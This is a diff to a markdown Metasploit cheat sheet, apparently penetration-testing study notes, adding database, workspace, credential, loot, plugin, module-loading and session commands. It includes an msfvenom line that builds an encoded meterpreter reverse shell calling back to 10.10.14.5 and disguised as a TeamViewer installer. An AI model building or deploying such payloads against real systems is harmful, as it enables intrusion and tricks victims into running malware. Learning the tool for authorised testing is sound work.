@@ -72,8 +72,77 @@ Suppose we want to select an Encoder for an existing payload. Then, we can use t
 msf6 <TYPE>(<MODULE>) > show encoders
 ```
 
+## Databases
+### Initiate the Database
+```bash
+$ sudo systemctl start postgresql
+$ sudo msfdb init
+$ sudo msfdb run
+```
+
+### Reinitiate the Database
+```bash
+$ msfdb reinit
+$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+$ sudo service postgresql restart
+$ msfconsole -q
+```
+
+### Using the Database
+#### Database Options
+```bash
+msf6 > help database
+```
+
+#### Workspaces
+We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
+
+```bash
+msf6 > workspace -h
+```
+
+#### Importing Scan Results
+```bash
+msf6 > db_import Target.xml
+```
+
+#### Data Backup
+```bash
+msf6 > db_export -h
+```
+
+#### Hosts
+The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. 
+
+```bash
+msf6 > hosts -h
+```
+
+#### Services
+The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.
+
+```bash
+msf6 > services -h
+```
+
+#### Credentials
+The creds command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.
+
+```bash
+msf6 > creds -h
+```
+
+#### Loot
+The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
+
+```bash
+msf6 > loot -h
+```
+
 ## Plugins
 `/usr/share/metasploit-framework/plugins`
+
+If the plugin is found here, we can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:
 
 ```bash
 msf6 > load <PLUGIN>
@@ -86,7 +155,9 @@ $ sudo cp ./<PLUGIN>.rb /usr/share/metasploit-framework/plugins/<PLUGIN>.rb
 
 ## Sessions
 ```bash
+# Background the current Session
 [CTRL] + [Z]
+
 # List Active Sessions
 msf6 <TYPE>(<MODULE>) > sessions
 
@@ -118,7 +189,10 @@ OPTIONS:
 We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.
 
 ```bash
-$ cp <MODULE>.rb /usr/share/metasploit-framework/modules/<PATH/><MODULE>.rb
+$ cp <our_module_here>.rb /usr/share/metasploit-framework/modules/<PATH/><MODULE>.rb
+$ msfconsole -m /usr/share/metasploit-framework/modules/
+msf6 > loadpath /usr/share/metasploit-framework/modules/
+msf6 > reload_all```
 ```
 
 * * *
@@ -179,7 +253,7 @@ $ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.
 
 ### Multiple Iterations
 ```bash
-$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`
+$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
 ```
 
 ## Evasion Techniques
